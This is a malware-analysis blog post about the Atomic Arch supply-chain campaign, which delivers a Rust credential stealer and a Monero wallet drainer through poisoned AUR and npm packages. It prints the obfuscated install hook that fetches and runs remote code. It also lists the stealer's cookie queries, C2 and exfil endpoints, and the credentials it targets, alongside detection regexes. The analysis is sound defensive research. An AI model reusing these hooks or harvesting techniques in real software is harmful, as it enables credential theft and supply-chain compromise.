---
layout: post
title: "Atomic Arch: the AUR package that swapped my Monero wallet for a drainer"
subtitle: "A Rust credential stealer, an eBPF rootkit, a Tor C2, and a trojaned monero-wallet-gui that every byte-level scan I threw at it called clean. The payload was hiding in compressed QML."
date: 2026-06-16
tags: [supply-chain, malware-analysis, aur, monero, ebpf, reverse-engineering, research]
category: research
tldr: "I went to install an AUR package, read its post-install hook on a whim, and caught it obfuscating a call out to /tmp. The thread unwound into Atomic Arch: a Rust stealer that validates your stolen GitHub and npm tokens and loads an eBPF rootkit, plus a rebuilt monero-wallet-gui. Every C++ scan said the wallet was stock, so I wrote it up as clean. I was wrong. The malice is twelve lines of zlib-compressed QML that sweep any wallet over 1 XMR to the attacker on first sync. A wallet drainer, not a miner, and here is the proof."
---

I install things from the AUR the way most Arch users do: read the `PKGBUILD` if I remember to, trust the rest, move on. This post is about the one time I did not move on. A binary package I was installing had a post-install hook that was quietly obfuscating a shell command, the kind of thing you notice once and cannot un-notice. I kept pulling on the thread and it kept going, down through a Rust credential stealer, a kernel-resident eBPF rootkit, a Tor hidden service for command and control, a stolen-token supply-chain pivot, and finally a Monero wallet that had been rebuilt to rob whoever opened it. The campaign has a name now: people are calling it Atomic Arch.

This campaign was documented before this post, and the work here builds on that rather than restating it. [Whanos](https://github.com/Whanos) published the detailed reverse-engineering of the stage-one `deps` stealer at [ioctl.fail](https://ioctl.fail/preliminary-analysis-of-aur-malware/): the XOR-encoded onion and its offsets, the `temp.sh` exfil, the eBPF rootkit internals, the persistence, and the target matrix. [CSA Labs](https://labs.cloudsecurityalliance.org/research/csa-research-note-aur-supply-chain-ebpf-rootkit-20260614-csa/), [Sonatype](https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency), and [lenucksi/aur-malware-check](https://github.com/lenucksi/aur-malware-check) mapped the campaign scope and the poisoned-package lists, which this post only samples (Sonatype scored it CVSS 8.7, and the cross-wave AUR list runs past 1,600 packages against the roughly 400 confirmed-malicious in the first wave). [JFrog Security Research](https://www.bleepingcomputer.com/news/security/over-400-arch-linux-packages-compromised-to-push-rootkit-infostealer/) and [SafeDep](https://safedep.io/ti/campaigns/ironworm/) tied the hardcoded mnemonic to IronWorm. This post spends its time on the second stage, which was the hardest piece to pin down: the rebuilt `monero-wallet-gui` scans byte-identical to stock at the native layer, so it reasonably reads as a possible cryptominer until you decompress the resource bundle. The rest of this writeup is what is actually inside that binary. It is not a miner. It is a wallet drainer, and the injected code, the destination address, the live fetch, and the proxy container it ships alongside are below.

I am also going to be straight about where I got it wrong, the call where I declared the second stage clean and had to walk it back.

The whole chain on one screen before we go deep:

```mermaid
flowchart TD
  A["INITIAL ACCESS<br/>attacker adopts an orphaned AUR package, poisons PKGBUILD + .install (obfuscated hook, sha256sums=SKIP)<br/>victim runs: pacman -S htbrowser-bin<br/>hook: cd /tmp && bun add … (hex-escaped) via npm sockpuppets atomic-lockfile / js-digest<br/>npm preinstall: ./src/hooks/deps (stripped Rust ELF named like a dependency)"]
  A --> F["STAGE 1 · deps stealer (Rust, tokio/rustls) + embedded eBPF rootkit<br/>harvest: browser cookies, Slack/Teams/Discord, SSH, GPG, wallets<br/>interrogate: Vault 127.0.0.1:8200, k3s, /proc/PID/environ<br/>PIVOT: validate GitHub+npm tokens, enumerate maintained packages<br/>eBPF rootkit: hide files/procs/sockets, SIGKILL debuggers<br/>persist: systemd unit, /var/lib/RAND/RAND"]
  F -->|"C2 over bundled Tor: GET (onion)/api/mt/ (machine-id Bearer) · exfil: POST (onion)/upload"| G["GET (onion)/bin/linux<br/>hash-checked, atomic replace of /usr/bin/monero-wallet-gui"]
  G --> J["STAGE 2 · trojaned monero-wallet-gui<br/>native C++/ELF = byte-stock 0.18.5.0<br/>malice = +12 lines in main.qml (QML)<br/>overwrites /usr/bin/monero-wallet-gui<br/>on sync, sweeps a wallet over 1 XMR to 865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C"]
  J --> K["SIDE OP (same operator)<br/>ghcr.io/fardewoak/herbsobering430<br/>xray proxy node behind a Cloudflare tunnel<br/>dcdeploy.jeongyein520.indevs.in routes to localhost:8001"]
  classDef stage fill:#14150e,stroke:#b3bd33,stroke-width:1px,color:#e2ddcd;
  classDef step fill:#1b1c13,stroke:#2e3020,color:#c9c9b8;
  class F,J,K stage;
  class A,G step;
```

## at a glance {#at-a-glance}

The rebuilt `monero-wallet-gui` scans byte-identical to stock at the native layer, which is why it reads as a possible cryptominer. It is a wallet drainer. The malice is twelve lines of QML inside the zlib-compressed Qt resource bundle, invisible to every ELF, symbol, and byte diff, that sweep any wallet holding more than 1 XMR to a hardcoded address the moment it finishes syncing. The proof below is a diff of that QML against the stock wallet, the sweep-all call semantics, and a stock-wallet negative control. Everything else here, the Rust stealer, the eBPF rootkit, the Tor C2, the proxy side-op, is how it gets onto the box and how it is delivered.
{:.callout-key}

| field | value |
|---|---|
| Campaign | Atomic Arch (AUR + npm/bun supply-chain), poisoning window June 10-13 2026 |
| Stage 1 | `deps` Rust credential stealer + embedded eBPF rootkit (`6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b`) |
| Stage 2 | trojaned `monero-wallet-gui v0.18.5.0`, a Monero **wallet drainer** (`47893d9badc38c54b71321263ce8178c1abb10396e0aadf9793e61ec8829e204`) |
| Payload location | 12 lines of QML injected into the zlib-compressed Qt resource bundle (`main.qml`) |
| Impact | auto-sweep of any synced wallet > 1 XMR to `865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C`, no user dialog (MITRE T1657) |
| C2 | Tor onion `olrh4mibs…onion`, `GET /api/mt/`, machine-id-derived Bearer |
| Actor | same operator/codebase as IronWorm. Lineage: Shai-Hulud -> IronWorm -> Atomic Arch |

**Analytic confidence:**

- <span class="badge-high">HIGH</span> the drainer logic and the destination address. Static proof: the injected QML, the documented `createTransactionAllAsync` sweep-all semantics, and a stock-wallet negative control. Caveat: live coin movement was **not** demonstrated. I scripted a funded private wallet in front of the trojan, but a Monero wallet regression ([#8600](https://github.com/monero-project/monero/issues/8600), hard fork v16 at height 1) keeps a regtest chain from ever crediting the balance, so the `> 1 XMR` sweep gate never trips. The runtime outcome is reasoned, not filmed.
- <span class="badge-mod">MODERATE-HIGH</span> Atomic Arch and IronWorm are the same operator or codebase. The link is an operator-unique BIP-39 mnemonic: it is in this campaign's `deps` binary (verified here, derives to ETH `0x7e28d9889f414b06c19a22a9bd316f0ac279a4d6`) and matches the one [JFrog and SafeDep](https://safedep.io/ti/campaigns/ironworm/) published for IronWorm, plus corroborating TTPs. Not HIGH, because the IronWorm side rests on their reporting rather than my own diff, and a worm that hardcodes a seed can carry it into accounts it hijacks.
- <span class="badge-low">LOW</span> that the GitHub account `fardewoak` maps to a specific human. It is a burner, and this campaign's stealer is *built* to take over developer accounts and republish under the victim's identity. I watched the first half happen (it validates stolen tokens and enumerates the victim's packages, captured live below). No public source shows the republish-as-victim half actually executed, and both observed waves came from fresh attacker accounts, not hijacked maintainers. Either way, an account-plus-artifact match is exactly the pattern that would frame an innocent victim, so I attribute the operating persona, not a named person.

## how this started {#how-this-started}

The package that started this was `htbrowser-bin`, a binary build, the kind of one-liner you install without a second thought:

```
$ paru -S htbrowser-bin
```

`paru` (or `yay`, or plain `makepkg -si`) fetches the `PKGBUILD`, builds it, and installs it, scriptlets and all. This time, for no principled reason, more habit than suspicion, I scrolled the `PKGBUILD` before I let it build, and something about it sat wrong. It reads almost completely normal: a binary repackage with a download and an `install -Dm755`. That is what makes the catch luck rather than skill, one glance I do not usually take. This is the shape of it, the one line that matters is the last field:

```bash
pkgname=htbrowser-bin
pkgver=1.4.2
pkgrel=1
arch=('x86_64')
source=("https://…/htbrowser-${pkgver}-x86_64.tar.gz")
sha256sums=('SKIP')                 # source is never integrity-checked
install=htbrowser-bin-deps.install  # <- the scriptlet, in a SEPARATE file
package() {
  install -Dm755 "$srcdir/htbrowser" "$pkgdir/usr/bin/htbrowser"
}
```

Against the clean package the change is tiny, and that is the point. Upstream `htbrowser-bin` shipped no `.install` file at all. The poisoned version adds one line to the `PKGBUILD` and one new file:

```diff
  pkgname=htbrowser-bin
  pkgver=1.4.2
  source=("https://…/htbrowser-${pkgver}-x86_64.tar.gz")
  sha256sums=('SKIP')
+ install=htbrowser-bin-deps.install            # added: points makepkg at the scriptlet
  package() { install -Dm755 "$srcdir/htbrowser" "$pkgdir/usr/bin/htbrowser"; }
+ # new file added alongside: htbrowser-bin-deps.install  (the obfuscated post_install below)
```

That is the entire AUR-side delta: one `install=` line and a scriptlet file. The same minimal change hit real, named packages, `guiscrcpy`, `alvr`, `netmon-git`, `keepassx2`, `inadyn-mt` among them, and a public example of the commit is `premake-git` `232b22dd` on the AUR (2026-06-09). Two honesty notes: that cgit diff is behind bot-protection as I write this, so I am citing it rather than re-quoting its body, and the `.install` I show below is the one I actually hold on disk. (Unrelated: `librewolf-fix-bin` and similar names float around in these discussions but belong to a separate 2025 ChaosRAT campaign, not this one.)

Two things slide past a skim. `sha256sums=('SKIP')` means the build trusts whatever the source URL serves, no hash pin. And `install=` points at a *scriptlet* in a separate file that `makepkg` runs automatically as part of installation, after the package lands, with the building user's privileges. People read the `PKGBUILD` and stop, because that is the file the AUR shows you first. Almost nobody opens the `.install`. That is exactly where the payload sits. The real captured `.install` (`pkgbuilds/htbrowser-bin-deps.install`) carried a `post_install()` that looked like this:

```bash
post_install() {
    $'\x63'"d" /tmp && bun a$'\x64'd ansi-colors nextfile-js
}
```

Strip the ANSI-C quoting and that is `cd /tmp && bun add ansi-colors nextfile-js`. The fuller version in the wild leans on three Bash tricks at once, and decoding it is just resolving each token:

```
obfuscated                     bash decodes via              result
  $'\x63'"d"                   \x63 = hex 'c'                cd
  "b"'u''n'                    adjacent-quote concat         bun
  'a'"d"'d'                    empty-string concat           add
  $'\141\x6e''s'"i"…           \141 octal 'a', \x6e hex 'n'  ansi-colors
  -> cd /tmp && bun add ansi-colors nextfile-js
```

Three obfuscation classes: hex escapes (`$'\x63'`), octal escapes (`$'\141'`), and empty-string or adjacent-quote concatenation (`'a''d''d'`). All three exist to defeat a naive `grep` for `bun add` or the package names. Each leaves a signature you can scan for:

```
hex marker          \$'\\x[0-9A-Fa-f]{2}
octal marker        \$'\\[1-7][0-7][0-7]
empty-concat        [A-Za-z0-9]('')|('')[A-Za-z0-9]
```

Run those signatures against the captured hook and they fire exactly where the decode table predicted. The real `.install` is heavier than the cleaned line above. Every character of `cd`, `bun`, `add`, and both package names is split or escaped:

```
$ cat htbrowser-bin-deps.install
post_install() {
  $'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a'"d"'d' $'\141\x6e''s'"i""-"$'\143''o''l''o''r'$'\x73' 'n'"e"'x'"t""f"'i''l''e''-''j''s'
}

$ grep -oE '\x[0-9A-Fa-f]{2}' htbrowser-bin-deps.install | wc -l   # hex escapes
3
$ grep -oE '\[1-7][0-7][0-7]' htbrowser-bin-deps.install | wc -l   # octal escapes
2
$ grep -oE "'\"|\"'|''" htbrowser-bin-deps.install | wc -l          # adjacent-quote concat boundaries
23
```

One short line stacking three escaping schemes: 3 hex escapes, 2 octal escapes, 23 quote-concatenation boundaries, all to keep `bun add ansi-colors nextfile-js` out of a substring `grep`. Resolve the `$'...'` escapes, strip the quotes, and it is exactly that command.

A post-install hook for a desktop package has no business running `bun add` against `/tmp`, and it definitely has no business spelling `cd` and `add` with hex escapes to get them past a casual reader. Obfuscation is intent. Nobody hides a benign command.

That was the whole hook. It did not even run the payload directly. It reached out through a package manager to pull more code. So the next question was obvious: what does `bun add` pull, and what runs when it lands.

## the line that didn't belong {#the-line}

The thing `bun add` pulls is an npm package with a `preinstall` script. That is the actual delivery mechanism. The AUR side is just the doormat.

```mermaid
flowchart TD
  A["AUR .install hook"] --> B["cd /tmp && bun add (pkg)<br/>(obfuscated, hex-escaped)"]
  B --> C["npm / bun package<br/>scripts: { preinstall: ./lib/install-deps.mjs }"]
  C --> D["executes a bundled ELF named like a dependency"]
  D --> E["STAGE ONE: Rust credential stealer"]
  classDef s fill:#14150e,stroke:#b3bd33,color:#e2ddcd;
  classDef n fill:#1b1c13,stroke:#2e3020,color:#c9c9b8;
  class E s;
  class A,B,C,D n;
```

The packages I could pin down used names built to look like build tooling. On npm: `atomic-lockfile@1.4.2`, `lockfile-js@1.4.2`, with `preinstall` pointing at `./src/hooks/deps`. On the bun path: `js-digest@4.2.2`, `preinstall` at `./lib/install-deps.mjs`. The `deps` and `install-deps` names are the trick. You see "deps" in a preinstall step and your eye slides right off it. It is not a dependency resolver. It is a stripped Rust ELF, and running the preinstall runs the binary.

How the AUR side got poisoned in the first place: the operator adopted orphaned packages. AUR packages whose maintainer has stepped down sit unmaintained and adoptable. Fresh throwaway accounts (the ones tracked include `krisztinavarga`, `franziskaweber`, `tobiaswesterburg`, `ellenmyklebust` in the first wave, `custodiatovar` and `veramagalhaes` in the second) took over maintainership of real packages, then edited the `PKGBUILD` and `.install` to pull the malicious npm/bun package during build. Other brand-new accounts were reported bulk-adopting orphaned packages in the same window (one is noted as taking on more than a dozen orphans in a few days), though not all of those have a malicious commit pinned to them yet, so I am listing them as a pattern, not a conviction. Some commits were dressed up with a forged author identity. The git log shows the commit author `PLYSHKA`, and at least one impersonates a known maintainer (`arojas`, a real KDE maintainer, who had nothing to do with it) to look legitimate.

Worth being precise, because this is exactly where reporting goes wrong: nobody's account was hijacked. AUR ownership transfer is procedural, not cryptographic, so adopting an orphaned package is a normal, sanctioned workflow and not a break-in. And setting a commit's author to `arojas` is one `git config user.name` line that needs zero access to the real arojas. An Arch Trusted User had to step in and correct early write-ups that read the forged author as a compromise. So the "takeover" is two mundane things stacked: claim an abandoned package the supported way, then lie in the commit metadata. No exploit, no stolen maintainer credentials, no hijacked account.
{:.callout-warn}

The npm side was published under sockpuppets too: `brixtai` published `js-digest`, `slsnvskse` published `lockfile-js`, `uquque` published `nextfile-js`. The npm packages were unpublished within hours (for example `js-digest@4.2.2` was created `2026-06-12T10:21:34Z` and pulled by `11:53:23Z`), but copies persist on registry mirrors, which is how the samples were still retrievable.

A detail that matters for who got hit: the AUR `pkgver` was not bumped between the clean and poisoned versions. `pacman -Qu` shows no update, so already-installed users were never prompted to upgrade. Only fresh installs during the poisoning window pulled the payload. The npm publish timestamps put the window at June 10 to 13 (`atomic-lockfile` on the 10th, `js-digest` and `lockfile-js` on the 12th, `nextfile-js` on the 13th).

So I had two stage-one binaries to look at, one from each delivery path:

- `deps`, sha256 `6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b`, 3,040,376 bytes, build-id `41980d03dc3c4809591db0ff17003a82bc067d97`, GLIBC_2.39
- `js-digest`, sha256 `7883bda1ff15425f2dbe622c45a3ae105ddfa6175009bbf0b0cad9bf5c79b316`, 3,193,176 bytes, build-id `a687aed5d0517aacb74e30737ed33ec470364a30`

Both stripped, both Rust.

```
$ file deps jsdigest_deps.bin
deps:             ELF 64-bit LSB pie executable, x86-64, dynamically linked,
                  interpreter /lib64/ld-linux-x86-64.so.2,
                  BuildID[sha1]=41980d03dc3c4809591db0ff17003a82bc067d97,
                  for GNU/Linux 4.4.0, stripped
jsdigest_deps.bin: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
                  interpreter /lib64/ld-linux-x86-64.so.2,
                  BuildID[sha1]=a687aed5d0517aacb74e30737ed33ec470364a30,
                  for GNU/Linux 4.4.0, stripped
```

## how I handled the sample {#handling}

Before any of the analysis below, where the sample came from, because provenance matters. The obfuscated `.install` hook is what caught my eye, but a shell one-liner is a pointer, not the payload. The binary it pulls, the `deps` stealer, had already been uploaded to MalwareBazaar, so I pulled the sample from there instead of running the live install chain on my own box. The public API gives the provenance in one request:

```
$ curl -s -X POST https://mb-api.abuse.ch/api/v1/ -H "Auth-Key: $MB_KEY" \
       -d 'query=get_info&hash=6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b' \
  | jq -r '.data[0] | {file_name, file_size, file_type, first_seen, reporter}'
  file_name  : "doNotDetonate"
  file_size  : 3040376
  file_type  : "elf"
  first_seen : "2026-06-13 16:18:31"
  reporter   : "c0r3dump3d"
```

The uploader named it `doNotDetonate`, which tells you the analyst who submitted it already knew what it was. I did not run the live `htbrowser-bin` chain to fetch the payload myself. The binary was already public, so I took the MalwareBazaar copy and hashed it, so the file every command below reads is exactly that upload:

```
$ sha256sum deps
6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b  deps
# == the MalwareBazaar 'doNotDetonate' entry (this file IS that upload, not a re-pulled one)
# retrohunt pivots: telfhash t16c31de44ac388bfad4a24901ac2515d7c153c67c3410c714ff60dee65eee489f62ae4f
#                   tlsh     T1FDE56F47F5E148B9C4E9CCB0871FE233EA3574899122B12B6BD89B413B26F209F5D791
```

That hash ties the file to the MalwareBazaar upload, so the link back to the dropper is worth closing rather than asserting. I can close it directly: I also held the `deps` ELF as shipped by npm, and it is byte-identical to the MalwareBazaar copy. The `atomic-lockfile@1.4.2` package runs its `preinstall` straight at an ELF (`./src/hooks/deps`). No install needed to prove it, just read the manifest and hash the extracted file:

```
$ python3 -c "import json; print(json.load(open('atomic-lockfile.package.json'))['scripts']['preinstall'])"
./src/hooks/deps                                  # atomic-lockfile@1.4.2 runs this ELF on install
$ sha256sum deps_from_npm.bin                     # = src/hooks/deps, extracted from the package, never run
6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b   # byte-identical to the MalwareBazaar deps
# npm's own recorded integrity for that path agrees (the base64 SHA-256 in the package file list):
$ python3 -c "import base64; print(base64.b64decode('YUTUM/igMWhph3tfg0yAElG7uTbl8Vd8VoCHjHRDyYs=').hex())"
6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b   # == the sample, recorded by the registry
```

So the file is the same bytes three ways: the npm-shipped payload, the registry's recorded integrity hash, and the MalwareBazaar upload. The same holds on the other delivery path: `js-digest`'s `preinstall` at `lib/install-deps.mjs` is also an ELF, not a script, hashing to `7883bda1` (my wave-2 sample, BuildID `a687aed5…`). The campaign spreads one stealer family across several sockpuppet packages, so the AUR package and the npm package are just two ends of the same drop: `atomic-lockfile` ships the wave-1 build (`6144d433`), `js-digest` ships the wave-2 build (`7883bda1`), and `htbrowser-bin`'s hook names a third sibling, `nextfile-js`, on the same bun path as `js-digest`. Two of the three are byte-matched to my samples here. All carry the same stealer (byte-identical embedded eBPF object `3607de25…`, same onion, proven in the eBPF and C2 sections below).

The rest of this analysis runs on the MalwareBazaar copy. The second stage is a different story: it is not on MalwareBazaar, VirusTotal, or Triage. It lives only behind the C2 onion, so I pulled that one from the live hidden service over Tor (more on that below).

I never ran either binary on my own machine or its network. I did the live work in a separate-kernel QEMU/KVM guest with an ephemeral overlay disk, no host filesystem mounts, and no real credentials anywhere inside it.

That isolation choice was not free advice from a blog. I learned it the hard way earlier in this same investigation. I had started with a network-namespace harness, thinking an isolated `unshare` mount namespace plus a faked `$HOME` was enough. It is not. `unshare -m` gives you a copy of the host mount tree, so the real filesystem stays readable, and a stealer does not care about your `$HOME` variable. It reads `/etc/passwd` and walks the real home paths it finds there (in my run, `/home/dev` and `/home/ubuntu`). The network was sealed so nothing left the box, but the filesystem gap was real. A shared-kernel container or namespace is not a malware lab. A separate kernel is. I redid it properly.

To be precise about what I did and did not do, because it is the responsible part of the workflow and not a hole in the story: I did not get infected. I noticed the obfuscated hook, did not run the install chain on my own machine, pulled the already-public sample from MalwareBazaar, and took it apart in an isolated VM. My host stayed clean (I checked every AUR package on it against the campaign indicators, none matched). So where this post narrates the victim's experience, that is reconstructed from the analysis, not my own box getting popped. That is how you are supposed to handle a live stealer.

## stage one: the deps stealer {#stage-one}

The sample at a glance:

```
File:     deps   (ELF 64-bit LSB PIE, x86-64)
Linking:  dynamic, interp /lib64/ld-linux-x86-64.so.2 (glibc, GNU/Linux 4.4.0)
Symbols:  stripped
Size:     3,040,376 bytes
Entry:    0xeae00      BuildID 41980d03dc3c4809591db0ff17003a82bc067d97
Sections: .text   0xeae00  size 0x1ee88a   (~2.0 MB Rust code)
          .rodata 0x19000  size 0x72519    (~458 KB; the harvest templates and the XOR onion live here)
          .data   0x2e4d80 size 0x3d18
          .bss    0x2e8aa0 size 0x5b08
```

The crate fingerprints survive stripping even when the source paths do not. What is left tells you the shape of the thing: `tokio` (async runtime), `rustls` plus `ring` (TLS without OpenSSL, and the source of the `ChaCha20-Poly1305` and `AES-GCM` strings in the binary, that is the TLS cipher suite, not a separate config crypto), `object` (ELF parsing), `nix` and `libc` (raw syscalls), and `libbpf`. That last one is the tell that the stealer carries and loads its own eBPF. More on the rootkit below. What is absent is its own tell: there is no `reqwest`, `hyper`, `ureq`, or any high-level HTTP client crate (all zero in both binaries), so every request it makes, GitHub, npm, Teams, the SOCKS hop, the multipart upload, is hand-assembled from raw `GET … HTTP/1.1\r\n` templates straight over `rustls`. That is why those request templates sit in `.rodata` as plain, readable strings.

```
$ strings deps | grep -oiE 'tokio|rustls|\bring\b|object|chacha20|libbpf' | tr 'A-Z' 'a-z' | sort | uniq -c
      5 chacha20      # all 5 are the TLS ChaCha20-Poly1305 suite (ring/rustls), not a config cipher
      7 libbpf
     21 object        # also the English word in error strings; the crate is present, the count is noisy
      2 ring
      2 rustls
      2 tokio
$ strings deps | grep -o 'tokio-rt-worker' | head -1
tokio-rt-worker
```

The build is panic-stripped, which bounds how far the crate fingerprinting goes. There are no `panicked at` strings (consistent with `panic=abort`), no `.cargo/registry` or `/rustc/` source paths, and no `cargo-auditable` section, so you recover crate identities but not their pinned versions, and Rust-side OSINT dead-ends there. The one thing the metadata does leak is the compiler, and it is a fresh one: `rustc 1.98.0-nightly` with the LLVM 22 backend, dated June 4, nine days before the sample first surfaced on MalwareBazaar.

```
$ strings deps | grep -oE 'rustc version [0-9].*\)|LLD [0-9.]+'
rustc version 1.98.0-nightly (e7815e522 2026-06-04)
LLD 22.1.6
$ readelf -SW deps | grep -c auditable       # no cargo-auditable section
0
$ for s in 'panicked at' '.cargo/registry' '/rustc/'; do printf '%-16s %s\n' "$s" "$(strings deps|grep -cF "$s")"; done
panicked at      0                           # panic=abort: no panic-location strings
.cargo/registry  0                           # no dependency source paths
/rustc/          0                           # no toolchain source paths
```

For completeness on the binary itself: it is a standard hardened release build, full RELRO (`BIND_NOW`), PIE, a non-executable stack, and stack canaries, identical in both stealers.

```
$ readelf -dW deps | grep -E 'BIND_NOW|FLAGS_1'
 0x000000000000001e (FLAGS)    BIND_NOW
 0x000000006ffffffb (FLAGS_1)  Flags: NOW PIE
$ readelf -lW deps | grep GNU_STACK
  GNU_STACK  0x000000 ... RW  0          # RW, not RWE -> non-executable stack
$ readelf -hW deps | grep Type:
  Type:  DYN (Position-Independent Executable file)
$ strings deps | grep -cF __stack_chk_fail
  1                                       # stack canaries
```

That is unremarkable on its own, no exploitation surface is implied, but it fits the rest of the posture: a stripped, statically linked Rust binary that gives up its crate names and almost nothing else.

What it collects, read straight from the `.rodata` string clusters and corroborated by detonation. These are not my paraphrase, they are the literal queries and endpoints carved out of the binary:

```
$ strings deps | grep -oE "SELECT encrypted_value FROM cookies WHERE[^\"]*LIMIT [0-9]+|POST /api/(auth\.test|conversations\.list) HTTP/1\.1|/api/v9/users/@me(/guilds\?with_counts=true)?|skypeToken|userPrincipalName|isAdminUser" | LC_ALL=C sort -u
/api/v9/users/@me
/api/v9/users/@me/guilds?with_counts=true
POST /api/auth.test HTTP/1.1
POST /api/conversations.list HTTP/1.1
SELECT encrypted_value FROM cookies WHERE host_key LIKE '%teams.microsoft.com' ORDER BY last_access_utc DESC LIMIT 30
SELECT encrypted_value FROM cookies WHERE name = 'd' AND host_key LIKE '%.slack.com' ORDER BY last_access_utc DESC LIMIT 1
isAdminUser
skypeToken
userPrincipalName
```

Reading those off the binary:

- **Browser session material.** Cookie databases and the SQL to pull session cookies out of them. The Slack query is explicit: `SELECT encrypted_value FROM cookies WHERE name='d' AND host_key LIKE '%.slack.com'`. Same pattern for Teams (`host_key LIKE '%teams.microsoft.com'`). The Discord token grab covers thirteen clients, including every third-party fork, pulled straight from the binary:

  ```
  $ strings deps | grep -oE 'Discord(Canary|PTB)?|Vesktop|Legcord|WebCord|ArmCord|Vencord|NativeCord|Abaddon|Dissent|Ripcord|Datcord' | sort -u
  Abaddon  ArmCord  Datcord  Discord  DiscordCanary  DiscordPTB
  Dissent  Legcord  NativeCord  Ripcord  Vencord  Vesktop  WebCord
  ```

  It reads the Local Storage / LevelDB of each, matching the `mfa.` token prefix, so an MFA-protected Discord account is no safer than a bare one once the token is on disk.

  The two cookie queries only pull Slack and Teams rows, but the binary runs them against a wide set of browsers. It carries a browser-target table of 18 Chromium-family families, each a display name paired with its profile directory (`BraveBraveSoftware/Brave-Browser`, `Microsoft Edgemicrosoft-edge`, and so on), covering the mainstream builds and the long tail (Brave, Vivaldi, Yandex, Epic, Iridium, Thorium, Comodo Dragon, SRWare Iron, Cent, Slimjet, Maxthon, UC, CocCoc, Naver Whale), with beta, dev, nightly, and Flatpak variants layered on top:

  ```
  $ strings deps | grep -oiE 'google-chrome|chromium|microsoft-edge|bravesoftware|vivaldi|opera|yandex-browser|epic-privacy-browser|iridium-browser|thorium|comodo-dragon|srware-iron|cent-browser|slimjet|maxthon|ucbrowser|coccoc|naver-whale' | tr A-Z a-z | sort -u | wc -l
  18
  ```

  So the cookie theft is narrow in *what* it lifts (two host-filtered queries) and wide in *where* it looks (every browser profile it can find a path for).
- **SaaS tokens and profiling.** It hits Slack `auth.test`, `conversations.list`, `users.info`. It pulls Microsoft Teams `skypeToken` and scrapes `userPrincipalName` and `isAdmin` off the Teams auth service. Discord gets `/api/v9/users/@me` and a guild enumeration with `mfa_enabled` and `premium_type`.
- **Telegram desktop session.** It targets the Telegram Desktop `tdata` session store, both the native and the snap path, and parses its on-disk format rather than just copying files:

  ```
  $ strings deps | grep -oE '(snap/telegram-desktop/current/)?\.local/share/TelegramDesktop/tdata|data did not match any variant of untagged enum FileLocation|struct FileIntegrity with [0-9]+ elements' | LC_ALL=C sort -u
  .local/share/TelegramDesktop/tdata
  data did not match any variant of untagged enum FileLocation
  snap/telegram-desktop/current/.local/share/TelegramDesktop/tdata
  struct FileIntegrity with 4 elements
  ```

  Those `FileLocation` / `FileIntegrity` strings are serde enum-parse errors, so the stealer is deserialising Telegram's `tdata` structure to lift the live session, which is enough to log in as the victim without their password or 2FA.
- **Shell and key material.** `.bash_history`, `.zsh_history`, fish history, `/etc/passwd`, `known_hosts` (and `known_hosts.old`), `.ssh`, the PEM markers `-----BEGIN` and `PRIVATE KEY`, and the `PuTTY-User-Key-File-` header. Like the wallet path and the GPG argline, these are packed as adjacent `.rodata` literals, so they surface as two run-together clusters rather than one string per target:

  ```
  $ strings -t x deps | grep -E '\.bash_history|known_hosts.*BEGIN'
    3fa97 /proc/self/status.bash_history.zsh_history.local/share/fish/fish_historyFAKEACCESSTESTACCESS123456abcdef/home
    42cfc .ds_storethumbs.dbdesktop.ini.lockknown_hostsknown_hosts.oldssh-----BEGINPRIVATE KEYPuTTY-User-Key-File-|1|share
  ```
- **AI coding-agent credentials.** The stealer tags its loot with short category labels in `.rodata`, and the full set reads as its own taxonomy of what it thinks is worth taking: `gh:`, `npm:`, `slack:`, `teams:`, `claude:`, `codex:`, with a `pgp:` label added in the js-digest build. Two of them, `claude:` and `codex:`, are the AI coding-agent credentials (Anthropic's Claude CLI and OpenAI's Codex CLI):

  ```
  $ strings deps | grep -E '^(gh|npm|slack|teams|claude|codex): $' | sort
  claude:
  codex:
  gh:
  npm:
  slack:
  teams:
  $ strings jsdigest_deps.bin | grep -cE '^pgp: $'           # the js-digest build adds a PGP label
  1
  $ strings deps | grep -icE 'openai|chatgpt|api\.openai'    # the generic API strings
  0
  ```

  So the stealer tags Anthropic's Claude (`claude:`) and OpenAI's Codex (`codex:`) credentials as their own loot types. The generic `openai`/`chatgpt` strings are absent, and the one `sk-` hit is a false positive (it is the substring inside the flag `--ask-password`, a`sk-`password), so OpenAI is targeted here through its Codex CLI, not the raw API name. The likely source is the `/proc/*/environ` sweep reading `ANTHROPIC_API_KEY` / `OPENAI_API_KEY` and the two agents' config directories, the same mechanism it uses for other env-borne secrets. I am describing only what is in these two samples. A different build could differ.
- **Wallets.** `/usr/bin/monero-wallet-gui` and `/opt/exodus` are both named explicitly, but the decompiled wallet routine (`fcn.001287f0`) treats them differently. `/opt/exodus` is only a presence check, it tests whether the directory exists and records the result, with no Exodus seed or vault file actually read. `monero-wallet-gui` is the one it acts on: that path is what the stager overwrites, the second-stage target. So this is wallet targeting, not Exodus wallet theft.

I got the mechanism wrong here at first, so it is worth correcting. My early notes had the stealer decrypting Chromium cookies locally with an AES routine. It does not. There is no `saltysalt`, no `peanuts` keyring constant, no PBKDF2, no AES-CBC anywhere in it. The `AES_256_GCM` strings that sent me that way are rustls TLS cipher-suite names, not a cookie decryptor. What it actually does is simpler: it lifts the encrypted cookie databases whole and ships them, and decryption happens later, on the operator's side. Right artifact, wrong mechanism, and what caught it was reading those AES strings against a benign control instead of taking them at face value.

